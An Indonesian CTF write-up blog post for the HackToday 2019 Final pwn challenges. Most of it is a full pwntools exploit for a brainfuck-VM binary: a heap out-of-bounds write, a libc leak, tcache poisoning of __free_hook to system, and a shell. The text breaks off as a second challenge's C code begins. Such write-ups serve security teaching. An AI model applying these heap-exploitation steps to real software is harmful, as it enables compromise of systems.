<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>HackToday 2019 Final - pwn | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous><link rel=icon type=image/svg+xml href=/favicon.svg></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>HackToday 2019 Final - pwn</h1><time datetime=2019-08-27T00:00:00+07:00>August 27, 2019</time></header><h2 id=vmxck>vmxck</h2><p>Desain awal soal ini sebenarnya ada hubungan dengan virtualisasi pada mesin dan bukan termasuk bagian dari <em>pwn</em>. Iya, ini awalnya akan dijadikan soal reversing dengan register state based vm dengan <code>kvm</code>. <img src=https://imgs.xkcd.com/comics/xkcde.png alt="vm di dalam vm"><em>vm di dalam vm</em> Beberapa hari sebelum final, input soal-soal untuk reversing ternyata udah lumayan banyak, rencana untuk lanjut dan menyelesaikan soal ini jadi gagal, wkwkw. Agak malas untuk memikirkan ide lain, saya pakai ide &ldquo;vm&rdquo; lagi dan gak berbeda jauh dari soal tahun lalu <code>anoneanone</code>. Soal ini masih sekitar brainfuck, <em>seharusnya</em> (belum di-cek :p) tidak ada overflow pada input dan double free. Bug justru terletak pada OOB akses data cell.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>struct</span> vmx {
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> prog;
</span></span><span style=display:flex><span>  <span style=color:#41a6b5>unsigned</span> <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> data;
</span></span><span style=display:flex><span>} vmx[<span style=color:#e0af68>20</span>];
</span></span></code></pre></div><p>Diberikan space sebanyak 20 &ldquo;vm&rdquo;, dengan setiap &ldquo;vm&rdquo; mempunyai <code>.data</code> dan <code>.prog</code> masing-masing. Sudah dijelaskan sebelumnya terdapat OOB pada akses data, dengan ukuran program yang sama besarnya dengan ukuran data.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  vmx[idx].prog <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>malloc</span>(<span style=color:#e0af68>0x250</span>);
</span></span><span style=display:flex><span>  vmx[idx].data <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>malloc</span>(<span style=color:#e0af68>0x250</span>);
</span></span></code></pre></div><p>Sebelum bahas lebih lanjut, ini helper functions untuk memudahkan interaksi dengan program,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>create</span>(bf):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(bf))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>run</span>(idx):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(idx))
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39;1. &#39;</span>, <span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>delete</span>(idx):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(idx))
</span></span></code></pre></div><p>Dengan OOB pada akses <code>.data</code>, salah satu yang dapat dilakukan adalah mengganti metadata dari heap chunk .data itu sendiri. ukuran dari chunk ini diubah menjadi lebih besar dari ukuran yang dapat ditampung tcache, tujuannya untuk mendapat leak libc.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>create(<span style=color:#9ece6a>&#39;.&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq $rebase((long*)&amp;vmx)</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756060     000055555575a270 000055555575a4d0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756070     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756080     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756090     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575a4c0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4c0     0000000000000000 0000000000000261</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4d0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#                                    ^^--------------------- mulai .data vmx[0]</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4e0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4f0     0000000000000000 0000000000000000</span>
</span></span></code></pre></div><p>karena perlu chunk dengan ukuran lebih besar dari ukuran sebenarnya, diperlukan &ldquo;fake&rdquo; chunk untuk bypass <code>"double free or corruption (!prev)"</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>create(<span style=color:#9ece6a>&#39;.&#39;</span>)
</span></span><span style=display:flex><span>create(<span style=color:#9ece6a>&#39;.&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq $rebase((long*)&amp;vmx)</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756060     000055555575a270 000055555575a4d0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756070     000055555575a730 000055555575a990</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756080     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756090     0000000000000000 0000000000000000</span>
</span></span></code></pre></div><p>dengan begitu ukuran chunk bisa diubah menjadi <code>(0x55555575a990-0x55555575a4d0) | PREV_INUSE = 0x4c1</code>. Dalam brainfuck, .data ptr hanya perlu di shift ke kiri sebanyak 8 kali untuk mencapai chunk metadata. Setelah itu, dengan <code>delete(0)</code> akan didapatkan libc leak.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#39;</span> <span style=color:#414868;font-style:italic># shift kiri .data ptr</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;+&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> (<span style=color:#e0af68>0xc0</span><span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>0x60</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&gt;++&#39;</span>
</span></span><span style=display:flex><span>create(payload)
</span></span><span style=display:flex><span>create(<span style=color:#9ece6a>&#39;.&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>run(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575a4c0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4c0     0000000000000000 00000000000004c1</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4d0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4e0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4f0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575a4c0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4c0     0000000000000000 00000000000004c1</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4d0     0000155555521ca0 0000155555521ca0 !!!!! leak</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4e0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575a4f0     0000000000000000 0000000000000000</span>
</span></span></code></pre></div><p>untuk mendapatakan leak, bisa gunakan instruksi <code>.</code>/<code>putchar</code> satu per satu dari .data cell. Ini bisa dilakukan karena setelah <code>free</code>, isi data tidak dikosongkan (<code>memset</code>) sama sekali.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;.&gt;&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span>
</span></span><span style=display:flex><span>create(payload)
</span></span><span style=display:flex><span>libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> (u64(run(<span style=color:#e0af68>0</span>)) <span style=color:#9ece6a;font-weight:700>-</span> libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__malloc_hook&#39;</span>]) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xFFFFFFFFFFFFF000</span>
</span></span><span style=display:flex><span>info(<span style=color:#9ece6a>&#39;libc 0x</span><span style=color:#9ece6a>%x</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (libc<span style=color:#9ece6a;font-weight:700>.</span>address))
</span></span></code></pre></div><p>setelah leak didapat yang perlu dikontrol selanjutnya adalah alokasi dari <code>malloc</code>. tcache poisoning disini bisa dilakukan, tapi dengan limitasi ukuran program hanya sebesar 0x250 dan tidak ada uaf. &ldquo;shift&rdquo; pointer data berulang kali dengan batasan ukuran program untuk mengotrol chunk lain dengan &ldquo;<code>&lt;</code>&rdquo; / &ldquo;<code>></code>&rdquo; juga tidak bisa. Trik yang digunakan disini adalah <code>[&lt;-]</code>. Sebagai visualisasi,</p><pre tabindex=0><code>    000055555575axxx     0000000000000000 0000000000000261 .prog
    000055555575axxx     ................ ................
    000055555575axxx     0000000000000007 0000000000000000
                                       ^^--------------------- mulai .prog vmx[n - 1]
    ...
    ...
    000055555575axxx     0000000000000000 0000000000000261 .data
    000055555575axxx     ................ ................
                                       ^^--------------------- mulai .data vmx[n]
    000055555575axxx     ................ ................
    000055555575axxx     ................ ................
</code></pre><p><code>[&lt;-------]</code>, <code>]</code> akan mengecek apakah <code>*ptr == 0</code>, jika tidak, loop akan tetap dieksekusi. Disini trik yang diguakan adalah shift data terus sampai ke posisi <code>*ptr == 7</code> (perhatikan bahwa di dalam loop, sebelum <code>]</code> terdapat 7 * <code>-</code>). Byte yang dilewati memang akan menjadi <em>amburadul</em>, tapi akhirnya tidak perlu dipedulikan juga, yang penting sudah bisa mengontrol chunk lain dan ratusan byte untuk program sudah dihemat dengan cara seperti ini.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;[&gt;---]&#39;</span>
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> p64(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p64(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p8(<span style=color:#e0af68>3</span>) <span style=color:#414868;font-style:italic># unique val</span>
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq $rebase((long*)&amp;vmx) 10</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756060     000055555575a270 000055555575a4d0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756070     000055555575a730 000055555575a990</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756080     000055555575a730 000055555575abf0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555756090     000055555575ae50 000055555575b0b0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555557560a0     000055555575b310 000055555575b570</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575b0a0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b0a0     0000000000000000 0000000000000261</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b0b0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#                                    ^^-------------------- vmx[3].data</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b0c0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b0d0     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575b300</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b300     0000000000000000 0000000000000261</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b310     0000000000000003 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#                                    ^^-------------------- unique value @ vmx[4].prog</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b320     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b330     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#e0af68>4</span>)
</span></span><span style=display:flex><span>run(<span style=color:#e0af68>3</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575b300</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b300     fdfdfdfdfdfdfdfd fdfdfdfdfdfdff5e</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b310     fdfd52525272b26d fdfdfdfdfdfdfdfd</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b320     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b330     0000000000000000 0000000000000000</span>
</span></span></code></pre></div><p>next step, tcache poisoning perlu bisa tulis pointer. Dengan input yang terbatas ini, ada cara yang lebih baik untuk menulis pointer dibandingkan dengan menambahkan isi cell secara manual, yakni copy value dari cell lain. Chunk yang dapat dikontrol sekarang adalah bagian <code>.prog</code>, artinya kita bisa menambahkan arbitrary data melalui input. value yang akan dicopy adalah <code>__free_hook</code>,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;[&gt;---]&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&lt;+++&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># perbaiki cell src, hancur sebelumnya karena [&gt;---]</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&lt;[-]&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># kosongin cell dest</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&gt;&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># balik ke cell src</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;[-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&gt;&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># copy value dari src ke dest cells</span>
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> p64(libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__free_hook&#39;</span>])
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p64(libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__free_hook&#39;</span>])
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p8(<span style=color:#e0af68>3</span>) <span style=color:#414868;font-style:italic># unique val</span>
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#e0af68>4</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575b300</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b300     0000000000000000 0000000000000261</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b310     00005555575b570 00001555555238e8</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b320     0000000000000003 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b330     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span>run(<span style=color:#e0af68>3</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq 0x55555575b300</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b300     fdfdfdfdfdfdfdfd fdfdfdfdfdfdff5e</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b310     00001555555238e8 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b320     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555575b330     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; bins</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># tcachebins</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0x260 [  2]: 0x55555575b310 —▸ 0x1555555238e8 (__free_hook) ◂— 0x0</span>
</span></span></code></pre></div><p>Oh, iya, sebelum <code>malloc</code> hancur karena tcache poisoning ini, lebih baik untuk menyiapkan <code>"/bin/sh"</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>create(<span style=color:#9ece6a>&#39;/bin/sh</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>) <span style=color:#414868;font-style:italic># 2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;[&gt;---]&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&lt;+++&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># perbaiki cell src, hancur sebelumnya karena [&gt;---]</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&lt;[-]&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># kosongin cell dest</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;&gt;&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># balik ke cell src</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;[-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&gt;&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>8</span> <span style=color:#414868;font-style:italic># copy value dari src ke dest cells</span>
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> p64(libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__free_hook&#39;</span>])
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p64(libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__free_hook&#39;</span>])
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p8(<span style=color:#e0af68>3</span>) <span style=color:#414868;font-style:italic># unique val</span>
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#e0af68>4</span>)
</span></span><span style=display:flex><span>run(<span style=color:#e0af68>3</span>)
</span></span></code></pre></div><p>Request <code>malloc</code> kedua setelah ini seharunya sudah mendarat di <code>__free_hook</code>, tapi karena <code>create()</code> itu sendiri melakukan 2 request <code>malloc</code>, untuk <code>.prog</code> dan <code>.data</code>, maka <code>.data</code>-lah yang akan mendarat di <code>__free_hook</code>. Berbeda dengan sebelumnya dimana kita bisa memanfaatkan value yang ditambahkan melalui input karena berada di <code>.prog</code>, kali ini <code>.data</code> hanya bisa memanfaatkan aritmatiknya saja tanpa arbitrary data melalui user input.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> get_min((libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span>  <span style=color:#e0af68>0</span>) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> get_min((libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span>  <span style=color:#e0af68>8</span>) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> get_min((libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span> <span style=color:#e0af68>16</span>) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> get_min((libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span> <span style=color:#e0af68>24</span>) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> get_min((libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span> <span style=color:#e0af68>32</span>) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>)
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> get_min((libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>] <span style=color:#9ece6a;font-weight:700>&gt;&gt;</span> <span style=color:#e0af68>40</span>) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xff</span>)
</span></span><span style=display:flex><span>create(payload) <span style=color:#414868;font-style:italic># 4</span>
</span></span><span style=display:flex><span>run(<span style=color:#e0af68>4</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; tel &amp;__free_hook</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00:0000│   0x1555555238e8 (__free_hook) —▸ 0x1555553b2e60 (system) ◂— test   rdi, rdi</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 01:0008│   0x1555555238f0 (__malloc_initialize_hook@GLIBC_2.2.5) ◂— 0x0</span>
</span></span></code></pre></div><p>dengan begitu, <code>delete(2)</code> seharusnya sudah memberikan shell, karena tadi sudah <code>create("/bin/sh")</code> pada index 2 dan <code>__free_hook</code> sudah menunjuk kepada <code>system</code></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic># profit</span>
</span></span><span style=display:flex><span>delete(<span style=color:#e0af68>2</span>)
</span></span></code></pre></div><h2 id=ezrop-revenge>ezrop revenge</h2><p>Soal ini ada kaitannya dengan <code>ezrop</code> pada <a href=/blog/hacktoday-2019-quals-pwn/#ezrop>kualifikasi</a>, dengan twist closed std{in,out,err}, static binary, x86, dengan EBP yang sudah di-<em>poison</em> seperti yang saya tulis <a href=/blog/hacktoday-2019-quals-pwn/#ezrop>sebelumnya</a>. Kalau dipikir lagi ini sebenarnya tidak menambahkan hal baru selain closed I/O, sehingga pada akhirnya saya membuat soal ini dengan buffer overflow biasa tanpa tambahan kerumitan lainnya. Kurang lebih seperti ini kodenya,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;unistd.h&gt;</span><span style=color:#414868;font-style:italic>
